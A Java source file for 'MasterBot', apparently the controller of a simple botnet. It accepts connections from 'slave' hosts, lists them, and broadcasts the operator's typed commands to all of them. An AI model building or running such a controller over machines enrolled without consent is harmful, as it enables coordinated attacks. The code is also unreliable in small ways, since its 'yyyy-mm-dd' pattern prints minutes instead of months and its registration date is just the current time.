

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

public class MasterBot extends Thread {

	private int serverPort = 9999;
	static List<ClientWorker> slaveConnections = new ArrayList<ClientWorker>();

	public MasterBot(int port) {
		this.serverPort = port;
	}

	/******* Main method ******/
	public static void main(String args[]) throws IOException {
		
			String stringPort;	
			String array1[];
			int port = 9999;
		if(args.length == 0){
			BufferedReader i = new BufferedReader(new InputStreamReader(System.in));
			stringPort = i.readLine();

			array1 = stringPort.split("\\s+");
			port = Integer.parseInt(array1[1]);
		}else if(args.length == 2 || (args[0].equals("-p")))
		{
		port = Integer.parseInt(args[1]);
		}

		BufferedReader in = new BufferedReader(new InputStreamReader(System.in));
		

		System.out.println("The Port Number that was entered is : " + port);
		MasterBot master = new MasterBot(port);
		master.start();
		System.out.print(">");

		while (true) {
			String command = in.readLine();
			if (command.trim().isEmpty()){
			System.out.print(">");
			continue;
			}
			if (command.contains("list")) {
				System.out.println(" SlaveHostName\t\t\t IPAddress\t\tSourcePortNumber\tRegistrationDate");
			}
			Iterator<ClientWorker> iter = slaveConnections.iterator();
			while (iter.hasNext()) {
				ClientWorker worker = iter.next();
				if (!worker.isRunning()) {
					iter.remove();
					continue;
				}
				
				if (command.contains("list")) {
					System.out.println(worker);
				} else{
					worker.sendCommand(command);
				}
			}
			if (command.contains("list")) {
				System.out.print(">");
			}
			if ("exit".equalsIgnoreCase(command)) {
				break;
			}
		}
	}

	public void run() {
		try (ServerSocket serversocket = new ServerSocket(serverPort);) {
			while (true) {
				Socket socket = serversocket.accept();
				ClientWorker worker = new ClientWorker(socket);
				Thread workerConnection = new Thread(worker);
				slaveConnections.add(worker);
				workerConnection.start();
			}
		} catch (IOException e) {
			System.out.println("-1");
			;
		}
	}
}

class ClientWorker implements Runnable {
	private Socket slaveSocket = null;
	private boolean isRunning = true;

	public ClientWorker(Socket socket) {
		this.slaveSocket = socket;
	}

	public void run() {
		try (DataInputStream dis = new DataInputStream(slaveSocket.getInputStream());) {
			String line = null;
			while ((line = dis.readUTF()) != null) {
				// System.out.println(line);
				if (">".equals(line)) {
					System.out.print(line);
				} else {
					System.out.println(line);
				}
			}
		} catch (Exception e) {
			isRunning = false;
			//System.out.println("Slave closed -> " + slaveSocket.toString());
		}
	}

	public void sendCommand(String command) {
		try {
			DataOutputStream dos = new DataOutputStream(slaveSocket.getOutputStream());
			dos.writeUTF(command);
		} catch (Exception e) {
			isRunning = false;
			System.out.println("Command failed - Slave closed -> " + slaveSocket.toString());
		}
	}

	public boolean isRunning() {
		return isRunning;
	}

	public String toString() {
		StringBuilder details = new StringBuilder();
		details.append(" " + slaveSocket.getRemoteSocketAddress() + "\t\t ");
		details.append(slaveSocket.getLocalAddress() + "\t\t");
		details.append(slaveSocket.getLocalPort() + "\t\t");
		String date = "yyyy-mm-dd";
		details.append("\t" + new SimpleDateFormat(date).format(new Date()) + " ");
		return details.toString();
	}
}

